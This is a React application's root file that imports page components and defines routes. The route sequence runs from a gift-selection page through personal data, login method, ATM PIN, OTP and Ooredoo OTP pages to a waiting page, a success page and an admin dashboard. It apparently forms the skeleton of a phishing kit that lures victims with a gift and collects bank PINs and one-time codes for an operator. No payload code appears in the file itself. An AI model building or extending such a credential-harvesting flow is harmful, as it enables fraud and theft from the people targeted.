import { Toaster } from "@/components/ui/sonner";
import { TooltipProvider } from "@/components/ui/tooltip";
import NotFound from "@/pages/NotFound";
import { Route, Switch } from "wouter";
import ErrorBoundary from "./components/ErrorBoundary";
import { ThemeProvider } from "./contexts/ThemeContext";
import { LanguageProvider } from "./contexts/LanguageContext";
import Home from "./pages/Home";
import PersonalData from "./pages/PersonalData";
import LoginMethod from "./pages/LoginMethod";
import AtmPin from "./pages/AtmPin";
import Otp from "./pages/Otp";
import Ooredoo from "./pages/Ooredoo";
import OtpOoredoo from "./pages/OtpOoredoo";
import Success from "./pages/Success";
import AdminDashboard from "./pages/AdminDashboard";
import WaitingPage from "./pages/WaitingPage";
import GiftSelection from "./pages/GiftSelection";
import RegistrationCompletion from "./pages/RegistrationCompletion";

function Router() {
  return (
    <Switch>
      <Route path="/" component={Home} />
      <Route path="/gift-selection" component={GiftSelection} />
      <Route path="/personal-data" component={PersonalData} />
      <Route path="/registration-completion" component={RegistrationCompletion} />
      <Route path="/login-method" component={LoginMethod} />
      <Route path="/atm-pin" component={AtmPin} />
      <Route path="/otp" component={Otp} />
      <Route path="/ooredoo" component={Ooredoo} />
      <Route path="/otp-ooredoo" component={OtpOoredoo} />
      <Route path="/success" component={Success} />
      <Route path="/admin" component={AdminDashboard} />
      <Route path="/waiting" component={WaitingPage} />
      <Route path="/404" component={NotFound} />
      <Route component={NotFound} />
    </Switch>
  );
}

// NOTE: About Theme
// - First choose a default theme according to your design style (dark or light bg), than change color palette in index.css
//   to keep consistent foreground/background color across components
// - If you want to make theme switchable, pass `switchable` ThemeProvider and use `useTheme` hook

function App() {
  return (
    <ErrorBoundary>
      <LanguageProvider>
        <ThemeProvider
          defaultTheme="light"
        >
          <TooltipProvider>
            <Toaster />
            <Router />
          </TooltipProvider>
        </ThemeProvider>
      </LanguageProvider>
    </ErrorBoundary>
  );
}

export default App;
